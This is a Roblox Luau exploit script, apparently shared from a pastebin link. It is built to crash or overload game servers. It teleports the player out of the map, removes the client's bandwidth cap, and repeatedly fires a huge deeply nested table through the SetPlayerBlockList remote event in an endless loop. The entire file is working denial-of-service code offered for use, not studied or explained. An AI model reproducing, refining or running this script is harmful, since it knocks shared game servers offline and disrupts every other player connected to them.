-- source https://pastebin.com/mguQ8eGi
-- updated at july 25, 2024

-- Initialize variables
local NetworkClient = game:GetService("NetworkClient")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Position and Anchor Character
local char = LocalPlayer.Character or nil
if char then
    char.HumanoidRootPart.CFrame = CFrame.new(0, 9e9, 0)
    task.wait(0.5)
    char.HumanoidRootPart.Anchored = true
end

-- Set Network Bandwidth Limit
local success, errorMessage = pcall(function()
    NetworkClient:SetOutgoingKBPSLimit(math.huge)
end)

if not success then
    print("Error setting network bandwidth limit:", errorMessage)
end

-- Function to create a large nested table and spam requests
local function getMaxValue(val)
    local mainValueIfOnTable = 499999
    if type(val) ~= "number" then
        return nil
    end
    local calculatePerfectVal = (mainValueIfOnTable / (val + 2))
    return calculatePerfectVal
end

local function Britain(tableIncrease, tries)
    local mainTable = {}
    local spammedTable = {}

    table.insert(spammedTable, {})
    local z = spammedTable[1]

    for i = 1, tableIncrease do
        local tableIns = {}
        table.insert(z, tableIns)
        z = tableIns
    end

    local calculateMax = getMaxValue(tableIncrease)
    local maximum

    if calculateMax then
        maximum = calculateMax
    else
        maximum = 999999
    end

    for i = 1, maximum do
        table.insert(mainTable, spammedTable)
    end

    for i = 1, tries do
        local success, errorMessage = pcall(function()
            ReplicatedStorage.SetPlayerBlockList:FireServer(mainTable)
        end)

        if not success then
            print("Error sending request:", errorMessage)
        end
    end
end

-- Execute the spam function
while wait(1.5) do
    Britain(289, 5) -- Adjust values if needed
end
